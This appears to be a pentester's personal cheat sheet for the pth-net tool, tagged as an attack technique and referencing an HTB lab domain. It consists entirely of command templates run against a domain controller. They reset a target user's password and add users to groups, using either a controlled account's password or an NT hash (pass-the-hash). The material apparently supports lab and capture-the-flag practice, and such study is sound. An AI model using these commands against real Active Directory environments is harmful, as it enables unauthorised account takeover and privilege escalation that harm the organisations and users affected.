# pth-net
#plateform/linux #target/remote #cat/ATTACK


## pth-net changing password
```
pth-net rpc '<NEW_PASSWORD_FOR_TARGET>' '<TARGET_USER>' '<PASSWORD>' -U 'infiltrator.htb'/'<CONTROLLED_USER>'%'<CONTROLLED_PASSWORD>' -S '<DOMAIN_CONTROLLER_IP>' 
```

## pth-net adding group
```
pth-net rpc group addmem '<GROUP_TO_ADD>' '<USER>' -U "infiltrator.htb"/"<CONTROLLED_USER>"%"<CONTROLLED_PASSWORD>" -S "<DOMAIN_CONTROLLER_IP>" 
```

## pth-net Adding a group member with hash
```
 pth-net rpc group addmem '<GROUP_TO_ADD>' '<USER>' -U '<DOMAIN>'/'<CONTROLLED_USER>'%'ffffffffffffffffffffffffffffffff':'<NT_HASH>' -S '<DOMAIN_CONTROLLER_IP>'
 ```

## pth-net changing password with hash
```
pth-net rpc <NEW_PASSWORD_FOR_TARGET> <TARGET_USER> -U <DOMAIN>/<CONTROLLED_USER>%ffffffffffffffffffffffffffffffff:<NT_HASH> -S <DOMAIN_CONTROLLER_IP>
 ```

